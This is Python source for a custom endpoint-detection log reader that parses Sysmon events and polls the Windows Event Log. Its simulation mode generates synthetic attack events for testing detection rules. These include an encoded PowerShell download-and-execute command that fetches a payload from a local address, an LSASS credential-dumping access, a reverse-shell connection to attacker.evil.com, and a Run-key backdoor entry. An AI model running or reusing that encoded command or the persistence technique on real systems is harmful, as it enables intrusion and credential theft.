"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  CUSTOM EDR — WINDOWS EVENT LOG READER                                      ║
║                                                                              ║
║  Reads Sysmon events from the Windows Event Log in real-time using          ║
║  win32evtlog (pywin32). Normalizes raw XML event data into typed            ║
║  dataclasses from event_schema.py.                                          ║
║                                                                              ║
║  Two operating modes:                                                        ║
║    1. LIVE: Subscribe to new events as they arrive (main detection mode)    ║
║    2. HISTORICAL: Batch-read past events (for catch-up on startup)         ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import re
import logging
import xml.etree.ElementTree as ET
from datetime import datetime, timezone, timedelta
from typing import Optional, Iterator, List, Any
from dataclasses import dataclass

# Graceful import — allows running on non-Windows for testing/CI
try:
    import win32evtlog
    import win32evtlogutil
    import win32con
    import win32api
    WINDOWS = True
    # Evt* constants — use getattr fallbacks in case older pywin32 doesn't export them
    EVT_RENDER_EVENT_XML   = getattr(win32evtlog, 'EvtRenderEventXml',        1)
    EVT_QUERY_CHANNEL_PATH = getattr(win32evtlog, 'EvtQueryChannelPath',      0x1)
    EVT_QUERY_FORWARD      = getattr(win32evtlog, 'EvtQueryForwardDirection', 0x100)
    EVT_QUERY_REVERSE      = getattr(win32evtlog, 'EvtQueryReverseDirection', 0x200)
    HAS_EVT_QUERY          = hasattr(win32evtlog, 'EvtQuery')
except ImportError:
    WINDOWS = False
    EVT_RENDER_EVENT_XML   = 1
    EVT_QUERY_CHANNEL_PATH = 0x1
    EVT_QUERY_FORWARD      = 0x100
    EVT_QUERY_REVERSE      = 0x200
    HAS_EVT_QUERY          = False
    logging.warning("pywin32 not available — running in SIMULATION MODE")

from detection_engine.event_schema import (
    BaseEvent, ProcessCreateEvent, NetworkConnectEvent, ProcessTerminateEvent,
    CreateRemoteThreadEvent, ProcessAccessEvent, FileCreateEvent,
    RegistryEvent, DnsQueryEvent, ProcessTamperingEvent
)

log = logging.getLogger("edr.log_reader")

# Sysmon event log channel name
SYSMON_LOG = "Microsoft-Windows-Sysmon/Operational"

# XML namespace used in Windows event XML
NS = "{http://schemas.microsoft.com/win/2004/08/events/event}"


class SysmonEventParser:
    """
    Parses raw Windows Event Log XML into structured event dataclasses.

    Windows event records come as XML strings. We parse them, extract
    the EventData fields, and construct strongly-typed dataclasses.
    """

    # Map Sysmon Event IDs to their handler methods
    PARSERS = {}

    def parse(self, xml_string: str, hostname: str = "localhost") -> Optional[BaseEvent]:
        """
        Parse a raw event XML string into a typed event dataclass.
        Returns None if the event type is not one we handle.
        """
        try:
            root = ET.fromstring(xml_string)
            system = root.find(f"{NS}System")
            if system is None:
                return None

            event_id_elem = system.find(f"{NS}EventID")
            if event_id_elem is None:
                return None

            event_id = int(event_id_elem.text or "0")

            # Extract timestamp
            time_created = system.find(f"{NS}TimeCreated")
            if time_created is not None:
                ts_str = time_created.get("SystemTime", "")
                try:
                    # Handle both formats: with and without fractional seconds
                    ts_str = ts_str.rstrip("Z")
                    if "." in ts_str:
                        timestamp = datetime.strptime(ts_str, "%Y-%m-%dT%H:%M:%S.%f")
                    else:
                        timestamp = datetime.strptime(ts_str, "%Y-%m-%dT%H:%M:%S")
                    timestamp = timestamp.replace(tzinfo=timezone.utc)
                except Exception:
                    timestamp = datetime.now(timezone.utc)
            else:
                timestamp = datetime.now(timezone.utc)

            # Extract all EventData fields into a flat dict
            event_data = {}
            event_data_elem = root.find(f"{NS}EventData")
            if event_data_elem is not None:
                for data in event_data_elem.findall(f"{NS}Data"):
                    name = data.get("Name", "")
                    value = data.text or ""
                    event_data[name] = value

            # Dispatch to specific parser
            parser_method = getattr(self, f"_parse_event_{event_id}", None)
            if parser_method:
                event = parser_method(event_id, timestamp, hostname, event_data)
                if event:
                    event.raw = event_data
                return event

        except Exception as e:
            log.debug(f"Failed to parse event XML: {e}")

        return None

    # ─── INDIVIDUAL EVENT PARSERS ────────────────────────────────────────────

    def _parse_event_1(self, eid, ts, host, d) -> ProcessCreateEvent:
        """Event ID 1: Process Created"""
        return ProcessCreateEvent(
            event_id=eid, timestamp=ts, hostname=host,
            process_guid=d.get("ProcessGuid", ""),
            process_id=int(d.get("ProcessId", 0) or 0),
            image=d.get("Image", ""),
            file_version=d.get("FileVersion", ""),
            description=d.get("Description", ""),
            product=d.get("Product", ""),
            company=d.get("Company", ""),
            original_filename=d.get("OriginalFileName", ""),
            command_line=d.get("CommandLine", ""),
            current_directory=d.get("CurrentDirectory", ""),
            user=d.get("User", ""),
            logon_id=d.get("LogonId", ""),
            terminal_session_id=d.get("TerminalSessionId", ""),
            integrity_level=d.get("IntegrityLevel", ""),
            hashes=d.get("Hashes", ""),
            parent_process_guid=d.get("ParentProcessGuid", ""),
            parent_process_id=int(d.get("ParentProcessId", 0) or 0),
            parent_image=d.get("ParentImage", ""),
            parent_command_line=d.get("ParentCommandLine", ""),
            parent_user=d.get("ParentUser", ""),
        )

    def _parse_event_3(self, eid, ts, host, d) -> NetworkConnectEvent:
        """Event ID 3: Network Connection"""
        return NetworkConnectEvent(
            event_id=eid, timestamp=ts, hostname=host,
            process_guid=d.get("ProcessGuid", ""),
            process_id=int(d.get("ProcessId", 0) or 0),
            image=d.get("Image", ""),
            user=d.get("User", ""),
            protocol=d.get("Protocol", ""),
            initiated=d.get("Initiated", "true").lower() == "true",
            source_ip=d.get("SourceIp", ""),
            source_hostname=d.get("SourceHostname", ""),
            source_port=int(d.get("SourcePort", 0) or 0),
            destination_ip=d.get("DestinationIp", ""),
            destination_hostname=d.get("DestinationHostname", ""),
            destination_port=int(d.get("DestinationPort", 0) or 0),
            destination_port_name=d.get("DestinationPortName", ""),
        )

    def _parse_event_5(self, eid, ts, host, d) -> ProcessTerminateEvent:
        """Event ID 5: Process Terminated"""
        return ProcessTerminateEvent(
            event_id=eid, timestamp=ts, hostname=host,
            process_guid=d.get("ProcessGuid", ""),
            process_id=int(d.get("ProcessId", 0) or 0),
            image=d.get("Image", ""),
            user=d.get("User", ""),
        )

    def _parse_event_8(self, eid, ts, host, d) -> CreateRemoteThreadEvent:
        """Event ID 8: CreateRemoteThread"""
        return CreateRemoteThreadEvent(
            event_id=eid, timestamp=ts, hostname=host,
            source_process_guid=d.get("SourceProcessGuid", ""),
            source_process_id=int(d.get("SourceProcessId", 0) or 0),
            source_image=d.get("SourceImage", ""),
            target_process_guid=d.get("TargetProcessGuid", ""),
            target_process_id=int(d.get("TargetProcessId", 0) or 0),
            target_image=d.get("TargetImage", ""),
            new_thread_id=int(d.get("NewThreadId", 0) or 0),
            start_address=d.get("StartAddress", ""),
            start_module=d.get("StartModule", ""),
            start_function=d.get("StartFunction", ""),
        )

    def _parse_event_10(self, eid, ts, host, d) -> ProcessAccessEvent:
        """Event ID 10: ProcessAccess"""
        return ProcessAccessEvent(
            event_id=eid, timestamp=ts, hostname=host,
            source_process_guid=d.get("SourceProcessGuid", ""),
            source_process_id=int(d.get("SourceProcessId", 0) or 0),
            source_thread_id=int(d.get("SourceThreadId", 0) or 0),
            source_image=d.get("SourceImage", ""),
            target_process_guid=d.get("TargetProcessGuid", ""),
            target_process_id=int(d.get("TargetProcessId", 0) or 0),
            target_image=d.get("TargetImage", ""),
            granted_access=d.get("GrantedAccess", ""),
            call_trace=d.get("CallTrace", ""),
        )

    def _parse_event_11(self, eid, ts, host, d) -> FileCreateEvent:
        """Event ID 11: FileCreate"""
        return FileCreateEvent(
            event_id=eid, timestamp=ts, hostname=host,
            process_guid=d.get("ProcessGuid", ""),
            process_id=int(d.get("ProcessId", 0) or 0),
            image=d.get("Image", ""),
            target_filename=d.get("TargetFilename", ""),
            creation_utc_time=d.get("CreationUtcTime", ""),
            hashes=d.get("Hashes", ""),
            user=d.get("User", ""),
        )

    def _parse_event_12(self, eid, ts, host, d) -> RegistryEvent:
        return self._parse_registry(eid, ts, host, d)

    def _parse_event_13(self, eid, ts, host, d) -> RegistryEvent:
        return self._parse_registry(eid, ts, host, d)

    def _parse_event_14(self, eid, ts, host, d) -> RegistryEvent:
        return self._parse_registry(eid, ts, host, d)

    def _parse_registry(self, eid, ts, host, d) -> RegistryEvent:
        """Event IDs 12/13/14: Registry events"""
        return RegistryEvent(
            event_id=eid, timestamp=ts, hostname=host,
            registry_event_type=d.get("EventType", ""),
            process_guid=d.get("ProcessGuid", ""),
            process_id=int(d.get("ProcessId", 0) or 0),
            image=d.get("Image", ""),
            target_object=d.get("TargetObject", ""),
            details=d.get("Details", ""),
            new_name=d.get("NewName", ""),
        )

    def _parse_event_22(self, eid, ts, host, d) -> DnsQueryEvent:
        """Event ID 22: DNS Query"""
        return DnsQueryEvent(
            event_id=eid, timestamp=ts, hostname=host,
            process_guid=d.get("ProcessGuid", ""),
            process_id=int(d.get("ProcessId", 0) or 0),
            image=d.get("Image", ""),
            query_name=d.get("QueryName", ""),
            query_status=d.get("QueryStatus", ""),
            query_results=d.get("QueryResults", ""),
            user=d.get("User", ""),
        )

    def _parse_event_25(self, eid, ts, host, d) -> ProcessTamperingEvent:
        """Event ID 25: Process Tampering"""
        return ProcessTamperingEvent(
            event_id=eid, timestamp=ts, hostname=host,
            process_guid=d.get("ProcessGuid", ""),
            process_id=int(d.get("ProcessId", 0) or 0),
            image=d.get("Image", ""),
            tampering_type=d.get("Type", ""),
        )


class SysmonLogReader:
    """
    Reads Sysmon events from the Windows Event Log.

    Primary path: legacy OpenEventLog/ReadEventLog API (confirmed working),
    using _record_to_xml() to reconstruct proper XML from StringInserts.
    Bonus path: EvtQuery/EvtRender if available (returns XML natively).
    """

    def __init__(self, hostname: str = "localhost"):
        self.hostname = hostname        # Used for OpenEventLog calls
        self.parser = SysmonEventParser()
        self._last_record_number = 0

        if not WINDOWS:
            log.warning("Not running on Windows — SysmonLogReader will use simulation mode.")

    def _get_hostname(self) -> str:
        try:
            import socket
            return socket.gethostname()
        except Exception:
            return "localhost"

    def read_historical(self, lookback_seconds: int = 300) -> List[BaseEvent]:
        """Read events from the past N seconds on startup."""
        if not WINDOWS:
            return []

        events = []
        cutoff = datetime.now(timezone.utc) - timedelta(seconds=lookback_seconds)
        hostname = self._get_hostname()

        # ── Try EvtQuery first (returns proper XML natively) ─────────────────
        if HAS_EVT_QUERY:
            try:
                cutoff_str = cutoff.strftime('%Y-%m-%dT%H:%M:%S.000Z')
                xpath = f"*[System[TimeCreated[@SystemTime >= '{cutoff_str}']]]"
                q = win32evtlog.EvtQuery(
                    SYSMON_LOG, EVT_QUERY_CHANNEL_PATH | EVT_QUERY_FORWARD, xpath
                )
                while True:
                    evts = win32evtlog.EvtNext(q, 50)
                    if not evts:
                        break
                    for evt_h in evts:
                        try:
                            xml_str = win32evtlog.EvtRender(evt_h, EVT_RENDER_EVENT_XML)
                            ev = self.parser.parse(xml_str, hostname)
                            if ev:
                                events.append(ev)
                        except Exception as e:
                            log.debug(f"EvtRender historical: {e}")
                log.info(f"Historical (EvtQuery): {len(events)} events loaded")
                return events
            except Exception as e:
                log.warning(f"EvtQuery historical failed ({e}) — using legacy API")

        # ── Legacy fallback: OpenEventLog + _record_to_xml ───────────────────
        try:
            h = win32evtlog.OpenEventLog(self.hostname, SYSMON_LOG)
            flags = win32evtlog.EVENTLOG_FORWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ
            while True:
                records = win32evtlog.ReadEventLog(h, flags, 0)
                if not records:
                    break
                for record in records:
                    try:
                        ts = record.TimeGenerated
                        if hasattr(ts, 'replace'):
                            ts = ts.replace(tzinfo=timezone.utc)
                            if ts < cutoff:
                                continue
                        xml_str = self._record_to_xml(record)
                        if xml_str:
                            ev = self.parser.parse(xml_str, hostname)
                            if ev:
                                events.append(ev)
                    except Exception as e:
                        log.debug(f"Legacy historical record: {e}")
            win32evtlog.CloseEventLog(h)
            log.info(f"Historical (legacy): {len(events)} events loaded")
        except Exception as e:
            log.error(f"Historical read failed: {e}")

        return events

    def read_live(self, poll_interval: float = 2.0) -> Iterator[BaseEvent]:
        """
        Generator that continuously yields new Sysmon events as they arrive.
        Uses self.hostname (= "localhost") for OpenEventLog — confirmed working.
        """
        if not WINDOWS:
            log.info("Simulation mode: yielding simulated events for testing.")
            yield from self._simulation_mode()
            return

        hostname = self._get_hostname()
        import time

        # ── Wait for Sysmon (use OpenEventLog which is confirmed working) ────
        log.info("Waiting for Sysmon event log...")
        while True:
            try:
                h = win32evtlog.OpenEventLog(self.hostname, SYSMON_LOG)
                win32evtlog.CloseEventLog(h)
                break   # Success
            except Exception as e:
                log.error(
                    f"Sysmon event log not accessible: {type(e).__name__}: {e}\n"
                    f"  >> Run:  Get-Service Sysmon64  (should show Running)\n"
                    f"  >> If stopped: Start-Service Sysmon64\n"
                    f"  >> Retrying in 10s..."
                )
                time.sleep(10)

        # ── Seek to end — get the last record number ─────────────────────────
        log.info("Sysmon log found! Seeking to end of event log...")
        try:
            h = win32evtlog.OpenEventLog(self.hostname, SYSMON_LOG)
            bwd = win32evtlog.EVENTLOG_BACKWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ
            records = win32evtlog.ReadEventLog(h, bwd, 0)
            if records:
                self._last_record_number = records[0].RecordNumber
            win32evtlog.CloseEventLog(h)
        except Exception as e:
            log.warning(f"Could not seek to end: {e}")

        log.info(f"Live monitoring started from record #{self._last_record_number}")

        # ── Choose the best live-polling strategy ────────────────────────────
        # Priority 1: EvtQuery/EvtRender — modern API, returns native XML
        if HAS_EVT_QUERY:
            try:
                win32evtlog.EvtQuery(
                    SYSMON_LOG, EVT_QUERY_CHANNEL_PATH | EVT_QUERY_REVERSE, '*'
                )
                log.info("Strategy: EvtQuery/EvtRender (native XML)")
                yield from self._live_poll_evtquery(hostname, poll_interval)
                return
            except Exception as e:
                log.warning(f"EvtQuery not usable: {e}")

        # Priority 2: wevtutil subprocess — guaranteed proper XML on any Windows system
        import subprocess as _sp
        try:
            _sp.run(
                ['wevtutil.exe', 'qe', SYSMON_LOG, '/c:1', '/f:xml', '/rd:false'],
                capture_output=True, timeout=5, check=True
            )
            log.info("Strategy: wevtutil subprocess (proper XML, reliable fallback)")
            yield from self._live_poll_wevtutil(hostname, poll_interval)
            return
        except Exception as e:
            log.warning(f"wevtutil not usable: {e}")

        # Priority 3: Legacy ReadEventLog + XML reconstruction from StringInserts
        log.info("Strategy: legacy ReadEventLog + XML reconstruction")
        yield from self._live_poll_legacy(hostname, poll_interval)

    def _live_poll_evtquery(self, hostname: str, poll_interval: float):
        """
        Poll using EvtQuery/EvtRender — returns native XML, no reconstruction needed.

        We query in REVERSE order (newest first) and grab the last 100 events,
        then filter by RecordID in Python. This avoids the broken Windows XPath
        syntax (*[System/EventRecordID > N] is invalid; correct form is
        *[System[EventRecordID > N]] but even that is unreliable across versions).
        """
        import time
        while True:
            try:
                # REVERSE query: newest events come first
                q = win32evtlog.EvtQuery(
                    SYSMON_LOG, EVT_QUERY_CHANNEL_PATH | EVT_QUERY_REVERSE, '*'
                )
                try:
                    evts = win32evtlog.EvtNext(q, 100)
                except Exception:
                    evts = []   # ERROR_NO_MORE_ITEMS raises in pywin32; treat as empty
                new_events = []
                for evt_h in (evts or []):
                    try:
                        xml_str = win32evtlog.EvtRender(evt_h, EVT_RENDER_EVENT_XML)
                        m = re.search(r'<EventRecordID>(\d+)</EventRecordID>', xml_str)
                        if not m:
                            continue
                        rid = int(m.group(1))
                        if rid <= self._last_record_number:
                            break   # Reading newest→oldest; once we hit old, stop
                        new_events.append((rid, xml_str))
                    except Exception as e:
                        log.debug(f"EvtRender live: {e}")

                # Yield in chronological order (oldest new event first)
                if new_events:
                    log.info(f"EvtQuery: {len(new_events)} new event(s) (RecordID > {self._last_record_number})")
                for rid, xml_str in sorted(new_events):
                    if rid > self._last_record_number:
                        self._last_record_number = rid
                    ev = self.parser.parse(xml_str, hostname)
                    if ev:
                        yield ev

            except Exception as e:
                log.warning(f"EvtQuery poll error: {e}")
            time.sleep(poll_interval)

    def _live_poll_wevtutil(self, hostname: str, poll_interval: float):
        """
        Poll using wevtutil.exe subprocess.

        Avoids XPath entirely — fetches the newest 100 events in reverse order
        and filters by RecordID in Python. This is guaranteed to work regardless
        of XPath quirks between Windows versions.
        """
        import time, subprocess
        log.info(f"wevtutil polling from record #{self._last_record_number}")

        while True:
            try:
                # /rd:true = reverse (newest first), /c:100 = last 100 events, no XPath
                cmd = [
                    'wevtutil.exe', 'qe', SYSMON_LOG,
                    '/rd:true', '/c:100', '/f:xml'
                ]
                result = subprocess.run(
                    cmd, capture_output=True, text=True,
                    encoding='utf-8', errors='replace', timeout=15
                )

                if result.returncode != 0 and result.stderr:
                    log.warning(f"wevtutil error: {result.stderr.strip()[:200]}")

                raw = result.stdout.strip()
                if not raw:
                    time.sleep(poll_interval)
                    continue

                # Split into individual <Event>…</Event> blocks via regex.
                # We avoid requiring xmlns= so this works regardless of how
                # wevtutil serialises the namespace (default ns or prefix).
                event_blocks = re.findall(
                    r'<Event\b[^>]*>.*?</Event>', raw, re.DOTALL
                )
                if not event_blocks:
                    time.sleep(poll_interval)
                    continue

                # Collect new events (wevtutil /rd:true → newest-first order)
                new_events = []
                for block in event_blocks:
                    try:
                        m = re.search(r'<EventRecordID>(\d+)</EventRecordID>', block)
                        if not m:
                            continue
                        rid = int(m.group(1))
                        if rid <= self._last_record_number:
                            break  # Reading newest→oldest; once we hit old, stop
                        new_events.append((rid, block))
                    except Exception as e:
                        log.debug(f"wevtutil block parse: {e}")

                # Yield in chronological order (oldest new event first)
                if new_events:
                    log.info(f"wevtutil: {len(new_events)} new event(s) (RecordID > {self._last_record_number})")
                for rid, xml_str in sorted(new_events):
                    if rid > self._last_record_number:
                        self._last_record_number = rid
                    ev = self.parser.parse(xml_str, hostname)
                    if ev:
                        yield ev

            except subprocess.TimeoutExpired:
                log.warning("wevtutil timed out — retrying")
            except Exception as e:
                log.warning(f"wevtutil poll error: {e}")
            time.sleep(poll_interval)

    def _live_poll_legacy(self, hostname: str, poll_interval: float):
        """
        Last-resort: OpenEventLog/ReadEventLog + StringInserts XML reconstruction.

        KEY FIX: After opening the handle (which starts at record 0), we fast-forward
        through old records WITHOUT sleeping until we catch up to _last_record_number.
        Only then do we start the normal poll loop with poll_interval sleeps.
        """
        import time
        try:
            handle = win32evtlog.OpenEventLog(self.hostname, SYSMON_LOG)
        except Exception as e:
            log.error(f"Could not open Sysmon log: {e}")
            return

        fwd = win32evtlog.EVENTLOG_FORWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ

        # ── Fast-forward: skip old events without sleeping ────────────────────
        log.info(f"Fast-forwarding past {self._last_record_number} old records...")
        while True:
            try:
                records = win32evtlog.ReadEventLog(handle, fwd, 0)
                if not records:
                    break   # Reached the end of existing events
                last_in_batch = records[-1].RecordNumber
                if last_in_batch >= self._last_record_number:
                    break   # This batch contains or passes our target — stop
                # Entire batch is old; skip without sleeping and read next batch
            except Exception:
                break
        log.info("Fast-forward complete — now monitoring live events")

        # ── Normal live-polling loop ──────────────────────────────────────────
        while True:
            try:
                records = win32evtlog.ReadEventLog(handle, fwd, 0)
                for record in (records or []):
                    if record.RecordNumber <= self._last_record_number:
                        continue
                    self._last_record_number = record.RecordNumber
                    try:
                        xml_str = self._record_to_xml(record)
                        if xml_str:
                            ev = self.parser.parse(xml_str, hostname)
                            if ev:
                                yield ev
                    except Exception as e:
                        log.debug(f"Legacy live record: {e}")
            except Exception as e:
                log.warning(f"ReadEventLog error: {e}. Reconnecting...")
                try:
                    win32evtlog.CloseEventLog(handle)
                    handle = win32evtlog.OpenEventLog(self.hostname, SYSMON_LOG)
                except Exception:
                    pass
            time.sleep(poll_interval)

    # Sysmon EventID → ordered list of field names from StringInserts
    _SYSMON_FIELDS = {
        1:  ["RuleName","UtcTime","ProcessGuid","ProcessId","Image","FileVersion",
              "Description","Product","Company","OriginalFileName","CommandLine",
              "CurrentDirectory","User","LogonGuid","LogonId","TerminalSessionId",
              "IntegrityLevel","Hashes","ParentProcessGuid","ParentProcessId",
              "ParentImage","ParentCommandLine","ParentUser"],
        3:  ["RuleName","UtcTime","ProcessGuid","ProcessId","Image","User",
              "Protocol","Initiated","SourceIsIpv6","SourceIp","SourceHostname",
              "SourcePort","SourcePortName","DestinationIsIpv6","DestinationIp",
              "DestinationHostname","DestinationPort","DestinationPortName"],
        5:  ["RuleName","UtcTime","ProcessGuid","ProcessId","Image","User"],
        8:  ["RuleName","UtcTime","SourceProcessGuid","SourceProcessId","SourceImage",
              "TargetProcessGuid","TargetProcessId","TargetImage","NewThreadId",
              "StartAddress","StartModule","StartFunction"],
        10: ["RuleName","UtcTime","SourceProcessGuid","SourceProcessId","SourceThreadId",
              "SourceImage","TargetProcessGuid","TargetProcessId","TargetImage",
              "GrantedAccess","CallTrace"],
        11: ["RuleName","UtcTime","ProcessGuid","ProcessId","Image","TargetFilename",
              "CreationUtcTime","Hashes","User"],
        12: ["RuleName","EventType","UtcTime","ProcessGuid","ProcessId","Image",
              "TargetObject","Details"],
        13: ["RuleName","EventType","UtcTime","ProcessGuid","ProcessId","Image",
              "TargetObject","Details"],
        14: ["RuleName","EventType","UtcTime","ProcessGuid","ProcessId","Image",
              "TargetObject","NewName"],
        22: ["RuleName","UtcTime","ProcessGuid","ProcessId","QueryName","QueryStatus",
              "QueryResults","Image","User"],
        25: ["RuleName","UtcTime","ProcessGuid","ProcessId","Image","Type"],
    }

    def _record_to_xml(self, record) -> Optional[str]:
        """
        Convert a legacy EVENTLOGRECORD to a minimal Sysmon XML string
        that our SysmonEventParser can handle.

        The legacy API's StringInserts tuple holds the event data values
        in a well-known order per EventID. We use _SYSMON_FIELDS to map
        them back to named fields and build synthetic XML.
        """
        try:
            import xml.sax.saxutils as saxutils
            event_id = record.EventID & 0xFFFF
            fields = self._SYSMON_FIELDS.get(event_id)
            if not fields:
                return None

            inserts = record.StringInserts or []
            ts = record.TimeGenerated
            if hasattr(ts, 'strftime'):
                ts_str = ts.strftime('%Y-%m-%dT%H:%M:%S.000000Z')
            else:
                ts_str = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%S.000000Z')

            ns = "http://schemas.microsoft.com/win/2004/08/events/event"
            data_parts = []
            for i, name in enumerate(fields):
                val = inserts[i] if i < len(inserts) else ""
                val_escaped = saxutils.escape(str(val) if val else "")
                data_parts.append(
                    f'<Data xmlns="{ns}" Name="{name}">{val_escaped}</Data>'
                )

            xml_str = (
                f'<Event xmlns="{ns}">'
                f'<System>'
                f'<EventID>{event_id}</EventID>'
                f'<TimeCreated SystemTime="{ts_str}"/>'
                f'<Computer>{saxutils.escape(record.ComputerName or "")}</Computer>'
                f'</System>'
                f'<EventData>{"".join(data_parts)}</EventData>'
                f'</Event>'
            )
            return xml_str
        except Exception as e:
            log.debug(f"_record_to_xml failed: {e}")
            return None

    def _simulation_mode(self) -> Iterator[BaseEvent]:
        """
        Generates fake events for testing on non-Windows systems.
        Useful for developing/testing the rule engine.
        """
        import time
        import random

        log.info("Running in SIMULATION MODE — generating synthetic events")
        hostname = "SIMULATED-HOST"
        now = datetime.now(timezone.utc)

        # Emit a simulated encoded PowerShell command
        yield ProcessCreateEvent(
            timestamp=now,
            hostname=hostname,
            process_id=1234,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line='powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQAJwApAA==',
            parent_image="C:\\Windows\\System32\\cmd.exe",
            user="SIMULATED-HOST\\attacker",
            integrity_level="High",
        )

        time.sleep(0.5)

        # Simulated LSASS access (credential dumping)
        yield ProcessAccessEvent(
            timestamp=datetime.now(timezone.utc),
            hostname=hostname,
            source_process_id=1234,
            source_image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            target_process_id=888,
            target_image="C:\\Windows\\System32\\lsass.exe",
            granted_access="0x1410",
            call_trace="C:\\Windows\\SYSTEM32\\ntdll.dll+...|UNKNOWN(00000000)|",
        )

        time.sleep(0.5)

        # Simulated reverse shell network connection
        yield NetworkConnectEvent(
            timestamp=datetime.now(timezone.utc),
            hostname=hostname,
            process_id=1234,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            user="SIMULATED-HOST\\attacker",
            protocol="tcp",
            initiated=True,
            source_ip="192.168.1.100",
            source_port=49888,
            destination_ip="10.10.10.10",
            destination_hostname="attacker.evil.com",
            destination_port=4444,
        )

        time.sleep(0.5)

        # Simulated registry persistence
        yield RegistryEvent(
            event_id=13,
            timestamp=datetime.now(timezone.utc),
            hostname=hostname,
            process_id=1234,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            target_object="HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate",
            details="C:\\Users\\attacker\\AppData\\Roaming\\backdoor.exe",
        )

        # Keep alive
        while True:
            time.sleep(5)
